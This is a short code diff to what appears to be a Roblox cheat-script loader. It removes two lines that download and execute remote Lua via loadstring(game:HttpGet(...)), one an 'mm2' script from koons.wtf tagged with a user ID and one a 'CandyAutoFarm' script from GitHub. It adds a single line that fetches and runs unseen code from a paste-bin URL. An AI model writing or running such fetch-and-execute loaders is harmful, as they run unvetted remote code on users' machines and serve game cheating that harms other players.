@@ -1,8 +1,1 @@
-task.spawn(function()
-     getgenv().KOONS_ID = "koons_0f2f689c22d4d846"
-loadstring(game:HttpGet("https://koons.wtf/lua/mm2.luau",true))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExodusHubScript/CandyAutoFarm/refs/heads/main/Eddie'sCandyAutoFarm"))()
-end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/2K3f4DXrV9/0"))()
